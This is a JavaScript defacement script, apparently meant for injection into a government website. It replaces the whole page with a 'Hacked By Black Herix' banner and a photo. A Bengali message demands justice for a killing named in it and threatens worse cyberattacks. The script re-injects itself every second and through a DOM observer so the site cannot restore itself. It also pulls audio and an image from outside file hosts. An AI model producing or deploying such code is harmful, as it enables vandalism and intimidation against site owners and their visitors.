(function() {
    // আপনার দেওয়া মেইন HTML এবং CSS কন্টেন্ট
    const defaceHTML = `
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>SYSTEM COMPROMISED BY BLACK HERIX</title>
    <style>
        :root {
            --blood-red: #ff0000;
            --mobile-padding: 16px;
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body, html {
            height: 100% !important; width: 100% !important; 
            overflow-y: auto !important; overflow-x: hidden !important;
            -webkit-overflow-scrolling: touch; background-color: #000000 !important;
            font-family: 'Courier New', 'Courier', monospace; color: #ff0000 !important;
            cursor: crosshair; scroll-behavior: smooth; position: relative;
        }

        .crt-scanlines {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 999999; opacity: 0.5;
            background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.1) 0px, rgba(0, 0, 0, 0.1) 2px, transparent 2px, transparent 4px);
        }

        .noise-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 999998; opacity: 0.04;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.5'/%3E%3C/svg%3E");
            background-size: 150px 150px;
        }

        .vignette {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 999997;
            background: radial-gradient(ellipse at center, rgba(0, 0, 0, 0) 40%, rgba(0, 0, 0, 0.8) 100%);
        }

        #matrix-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0; pointer-events: none; opacity: 0.25;
        }

        .particles-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none;
        }

        .particle {
            position: absolute; color: #ff0000; font-size: 1rem; opacity: 0;
            animation: floatUp 10s linear infinite; text-shadow: 0 0 6px #ff0000; will-change: transform, opacity;
        }

        @keyframes floatUp {
            0% { transform: translateY(110vh) translateX(0) rotate(0deg); opacity: 0; }
            8% { opacity: 0.8; }
            50% { opacity: 0.4; }
            90% { opacity: 0.05; }
            100% { transform: translateY(-20vh) translateX(30px) rotate(180deg); opacity: 0; }
        }

        .wrapper {
            position: relative; z-index: 5; max-width: 700px; margin: 0 auto;
            padding: 24px 16px 40px; text-align: center; width: 100%; min-height: 100vh;
            display: flex; flex-direction: column; align-items: center; justify-content: flex-start;
        }

        .threat-level-bar {
            display: flex; align-items: center; justify-content: center; gap: 6px; flex-wrap: wrap;
            margin-bottom: 18px; padding: 8px 14px; background: rgba(0, 0, 0, 0.9); border: 1px solid #ff0000;
            letter-spacing: 1px; font-size: 0.7rem; font-weight: bold; color: #ff4444; box-shadow: 0 0 15px rgba(255, 0, 0, 0.4); width: 100%; max-width: 500px; line-height: 1.4;
        }

        .threat-dot { display: inline-block; width: 6px; height: 6px; background: #ff0000; border-radius: 50%; animation: dotBlink 1s infinite; flex-shrink: 0; }
        @keyframes dotBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        .warning-box {
            border: 2px solid #ff0000; background: rgba(10, 0, 0, 0.9); padding: 12px 10px; margin-bottom: 24px;
            font-weight: bold; letter-spacing: 1px; font-size: 0.75rem; box-shadow: 0 0 25px rgba(255, 0, 0, 0.5); text-shadow: 0 0 6px #ff0000; width: 100%; max-width: 500px; word-break: break-word; line-height: 1.5;
        }

        .img-frame { display: inline-block; position: relative; margin-bottom: 24px; padding: 3px; background: rgba(0, 0, 0, 0.8); border: 2px solid #ff0000; box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); max-width: 85vw; }
        .img-frame::before { content: 'TARGET ACQUIRED'; position: absolute; top: -24px; left: 50%; transform: translateX(-50%); background: #ff0000; color: #000; padding: 2px 10px; font-size: 0.6rem; font-weight: bold; letter-spacing: 2px; white-space: nowrap; z-index: 2; animation: blink 1.5s infinite; }

        .target-img { width: 140px; height: 140px; object-fit: cover; display: block; filter: saturate(1.2) contrast(1.1) brightness(0.95); }

        .hacker-main { font-size: 1.6rem; font-weight: 900; color: #fff; text-shadow: 0 0 12px #ff0000, 0 0 30px #ff0000; margin-bottom: 20px; letter-spacing: 1px; line-height: 1.3; word-break: break-word; max-width: 100%; }

        .threat-message {
            color: #ff1a1a; font-size: 0.9rem; font-weight: bold; line-height: 1.6; margin-bottom: 30px;
            background: rgba(5, 0, 0, 0.9); padding: 16px 14px; border-left: 3px solid #ff0000; border-right: 3px solid #ff0000; text-align: justify; box-shadow: 0 0 25px rgba(255, 0, 0, 0.35); width: 100%; max-width: 500px; position: relative;
        }

        .corner-bracket { position: absolute; width: 12px; height: 12px; border-color: #ff0000; border-style: solid; }
        .corner-tl { top: 3px; left: 3px; border-width: 2px 0 0 2px; }
        .corner-tr { top: 3px; right: 3px; border-width: 2px 2px 0 0; }
        .corner-bl { bottom: 3px; left: 3px; border-width: 0 0 2px 2px; }
        .corner-br { bottom: 3px; right: 3px; border-width: 0 2px 2px 0; }

        .demand-text { font-size: 1.1rem; color: #00ff00; margin: 12px 0; text-shadow: 0 0 10px #00ff00, 0 0 25px #00ff00; font-weight: bold; letter-spacing: 0.5px; line-height: 1.5; word-break: break-word; animation: demandPulse 2s infinite; }
        @keyframes demandPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }

        .ultimatum {
            border-top: 2px dashed #ff0000; border-bottom: 2px dashed #ff0000; padding: 22px 8px 16px;
            color: #ffff00; font-size: 0.9rem; font-weight: bold; text-shadow: 0 0 8px #ffff00; line-height: 1.6; background: rgba(20, 10, 0, 0.7); position: relative; letter-spacing: 0.3px; box-shadow: 0 0 20px rgba(255, 200, 0, 0.15); margin-top: 8px; width: 100%; max-width: 500px; text-align: center;
        }
        .ultimatum::before { content: '⚠ ULTIMATUM ⚠'; position: absolute; top: -13px; left: 50%; transform: translateX(-50%); background: #000; padding: 2px 14px; color: #ffff00; font-size: 0.7rem; letter-spacing: 2px; border: 1px solid #ffff00; animation: blink 1s infinite; white-space: nowrap; }

        .click-notice { margin-top: 28px; font-size: 0.7rem; color: #666; animation: blink 2s infinite; letter-spacing: 1px; padding: 6px 12px; border: 1px solid rgba(255, 0, 0, 0.3); display: inline-block; background: rgba(0, 0, 0, 0.6); max-width: 90%; }

        .status-bar { margin-top: 20px; display: flex; justify-content: center; align-items: center; padding: 6px 10px; background: rgba(0, 0, 0, 0.85); border: 1px solid #333; font-size: 0.55rem; color: #666; letter-spacing: 1px; flex-wrap: wrap; gap: 6px; text-align: center; width: 100%; max-width: 500px; }
        .status-bar span { color: #ff0000; animation: blink 3s infinite; white-space: nowrap; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        @media (min-width: 600px) {
            .wrapper { padding: 32px 20px 50px; }
            .target-img { width: 180px; height: 180px; }
            .hacker-main { font-size: 2.2rem; }
            .threat-message { font-size: 1rem; }
            .demand-text { font-size: 1.3rem; }
            .ultimatum { font-size: 1rem; }
            .warning-box { font-size: 0.85rem; }
            .threat-level-bar { font-size: 0.8rem; }
        }
    </style>
</head>
<body>
    <audio id="bg-music" loop preload="none">
        <source src="https://files.catbox.moe/tcj7j8.mp3" type="audio/mpeg">
    </audio>
    <div class="crt-scanlines"></div>
    <div class="noise-overlay"></div>
    <div class="vignette"></div>
    <canvas id="matrix-canvas"></canvas>
    <div class="particles-container" id="particles-container"></div>
    <div class="wrapper">
        <div class="threat-level-bar">
            <span class="threat-dot"></span><span>[ THREAT: CRITICAL ]</span><span class="threat-dot"></span>
            <span style="color:#ff6666;">|</span><span>[ TARGET: GOV ]</span>
        </div>
        <div class="warning-box">🛑 [!] SYSTEM COMPROMISED BY OUTLAWS [!] 🛑</div>
        <div class="img-frame"><img src="https://i.ibb.co/ccrjKJh5/1000021966.jpg" alt="Lamisa" class="target-img"></div>
        <h1 class="hacker-main">Hacked By Black Herix</h1>
        <div class="threat-message">
            <span class="corner-bracket corner-tl"></span><span class="corner-bracket corner-tr"></span>
            <span class="corner-bracket corner-bl"></span><span class="corner-bracket corner-br"></span>
            আমাদের নীরবতাকে দুর্বলতা ভাববেন না। প্রশাসন এবং সরকারের উচ্চপদস্থ কর্মকর্তাদের কান খুলে শুনে রাখা উচিত— আইন যদি নিজের গতিতে না চলে, তবে আমরা আমাদের নিজস্ব গতিতে বিচার করতে বাধ্য হবো। ডিজিটাল দেয়াল ভেঙে গুঁড়িয়ে দেওয়া কেবল আমাদের ক্ষমতার একটা ছোট ট্রেইলার মাত্র।
        </div>
        <div class="slogan-zone">
            <p class="demand-text">🛑 রামিসা হত্যার সঠিক বিচার চাই 🛑</p>
            <p class="demand-text">🛑 রামিসা হত্যার সঠিক বিচার চাই 🛑</p>
            <p class="demand-text">🛑 রামিসা হত্যার সঠিক বিচার চাই 🛑</p>
        </div>
        <div class="ultimatum">অবিলম্বে রামিসা হত্যার সুষ্ঠু ও প্রকাশ্য বিচার নিশ্চিত করা না হয়, তবে পরবর্তী সাইবার হামলা হবে আরও ভয়াবহ। জাস্ট ওয়েট অ্যান্ড ওয়াচ!</div>
        <p class="click-notice">[ সাইটের যেকোনো জায়গায় ক্লিক করলে অডিও চালু হবে ]</p>
        <div class="status-bar"><span>● ENCRYPTED</span><span>|</span><span>CONN: SECURE</span><span>|</span><span>TRACE: FAILED</span><span>|</span><span>BLACK HERIX</span></div>
    </div>
</body>
</html>
`;

    // জোরপূর্বক ডম (DOM) পুরোপুরি ওভাররাইট করার জন্য মেইন ফাংশন
    function injectDeface() {
        if (document.documentElement.innerHTML !== defaceHTML) {
            document.open();
            document.write(defaceHTML);
            document.close();
            startEffects(); // ম্যাট্রিক্স ও পার্টিকল ইফেক্ট চালু করার কল
        }
    }

    // ম্যাট্রিক্স এবং পার্টিকল ইফেক্টের আসল লজিক যা ব্যাকগ্রাউন্ডে চলবে
    function startEffects() {
        const canvas = document.getElementById('matrix-canvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        let width, height, columns, drops, fontSize;
        let lastTime = 0;
        const fpsInterval = 1000 / 8;

        function resizeMatrix() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
            fontSize = (width < 400) ? 10 : 12;
            columns = Math.floor(width / fontSize);
            drops = new Array(columns).fill(1);
        }

        function drawMatrix(timestamp) {
            if (timestamp - lastTime < fpsInterval) {
                requestAnimationFrame(drawMatrix);
                return;
            }
            lastTime = timestamp;
            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
            ctx.fillRect(0, 0, width, height);
            ctx.fillStyle = '#ff0000';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const char = String.fromCharCode(0x30A0 + Math.random() * 96);
                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > height && Math.random() > 0.98) drops[i] = 0;
                drops[i]++;
            }
            requestAnimationFrame(drawMatrix);
        }
        resizeMatrix();
        requestAnimationFrame(drawMatrix);

        // পার্টিকল জেনারেটর
        const container = document.getElementById('particles-container');
        const symbols = ['☠', '⚠', '⚡', '☣'];
        setInterval(() => {
            if (!container) return;
            const particle = document.createElement('span');
            particle.classList.add('particle');
            particle.textContent = symbols[Math.floor(Math.random() * symbols.length)];
            particle.style.left = Math.random() * 90 + '%';
            particle.style.animationDuration = (Math.random() * 8 + 6) + 's';
            container.appendChild(particle);
            setTimeout(() => particle.remove(), 10000);
        }, 3000);
    }

    // পেজ লোড হওয়া মাত্রই প্রথমবার রান হবে
    injectDeface();

    // পার্মানেন্ট লক রাখার জন্য টাইমার লুপ (প্রতি ১ সেকেন্ড পর পর চেক করবে)
    setInterval(injectDeface, 1000);

    // কোনো স্ক্রিপ্ট যেন ডম পরিবর্তন করতে না পারে সেজন্য অবজার্ভার লক
    const observer = new MutationObserver(injectDeface);
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // অডিও প্লে করার গ্লোবাল লিসেনার
    document.addEventListener('click', function() {
        const audio = document.getElementById('bg-music');
        if (audio) { audio.play().catch(e => console.log("Audio blocked")); }
    });
})();
